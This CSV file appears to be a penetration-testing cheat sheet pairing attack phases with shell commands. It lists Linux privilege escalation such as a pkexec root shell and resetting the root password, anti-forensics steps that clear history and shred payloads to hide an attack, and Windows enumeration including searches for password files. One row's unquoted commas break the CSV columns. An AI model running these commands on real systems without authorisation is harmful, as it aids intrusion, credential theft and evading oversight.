target_type,subtype,phase,tool,command,notes
System,Linux,PrivEsc,pkexec,pkexec /bin/bash,"Attempts to escalate privileges by spawning a root shell through PolicyKit's pkexec utility."
System,Linux,PrivEsc,exploit-db,searchsploit kernel,"Searches Exploit-DB for exploits against the detected kernel version, aiding in privilege escalation research."
System,Linux,PrivEsc,passwd,passwd root,"If privileges allow, resets the root account password, immediately granting full system control."
System,Linux,PrivEsc,find,find / -perm -u=s -type f 2>/dev/null,"Scans for SUID/SGID binaries, which can be abused for privilege escalation if misconfigured."
System,Linux,PrivEsc,capsh,getcap -r / 2>/dev/null,"Lists all files with Linux capabilities set, which may grant unexpected privileges exploitable for escalation."
System,Linux,Cleanup,history,history -c; history -w,"Clears the shell history for the current user, erasing traces of commands used during an attack."
System,Linux,Cleanup,rm,rm -rf /tmp/payload,"Forcefully deletes the attack payload from disk to remove evidence of compromise."
System,Linux,Cleanup,shred,shred -u /tmp/file,"Securely deletes files using multiple overwrites, making recovery by forensics extremely difficult."
System,Linux,Cleanup,unset,unset HISTFILE,"Unsets the shell history file variable to prevent future command logging."

System,Windows,Enumeration,systeminfo,systeminfo,"Prints detailed OS version, installed hotfixes, build info, and hardware details. Useful for identifying missing patches and system weaknesses."
System,Windows,Enumeration,whoami,whoami /all,"Displays current user, group memberships, privileges, and token info. Helps assess privilege escalation opportunities."
System,Windows,Enumeration,net,net user,"Lists all user accounts defined on the machine, useful for targeting privileged or unused accounts."
System,Windows,Enumeration,ipconfig,ipconfig /all,"Shows all network interfaces, MAC addresses, and IP settings, useful for lateral movement and understanding network segmentation."
System,Windows,Enumeration,tasklist,tasklist,"Displays all running processes, which can help identify AV, EDR, or attacker implants."
System,Windows,Enumeration,netstat,netstat -ano,"Lists all network connections and listening ports, mapping out active communication and open services."
System,Windows,Enumeration,wmic,wmic qfe get Caption,Description,HotFixID,InstalledOn,"Retrieves all installed hotfixes, revealing unpatched vulnerabilities or recently applied security updates."
System,Windows,Enumeration,reg,reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\","Shows all programs set to auto-start, often used by malware for persistence."
System,Windows,Enumeration,arp,arp -a,"Displays the ARP table, mapping other devices on the LAN recently communicated with."
System,Windows,Enumeration,route,route print,"Prints the system routing table, highlighting default gateways and network architecture."
System,Windows,Enumeration,net,net localgroup administrators,"Lists all users in the administrators group. Essential for identifying privilege escalation targets."
System,Windows,Enumeration,driverquery,driverquery,"Displays a list of all installed drivers, which can reveal vulnerable or third-party components."
System,Windows,Enumeration,sc,sc query,"Lists installed and running services, which can be targets for persistence or privilege escalation."
System,Windows,Enumeration,fsutil,fsutil fsinfo drives,"Lists all drives on the system, including removable and mapped drives. Good for data discovery."
System,Windows,Enumeration,dir,dir C:\\ /s /b | findstr password,"Searches all files on C: for filenames containing 'password', helping locate sensitive data."
System,Windows,Enumeration,findstr,findstr /si password *.txt,"Scans all .txt files for the keyword 'password', useful for credential discovery."
System,Windows,Enumeration,netsh,netsh firewall show state,"Displays current firewall state and rules, useful for identifying communication restrictions."
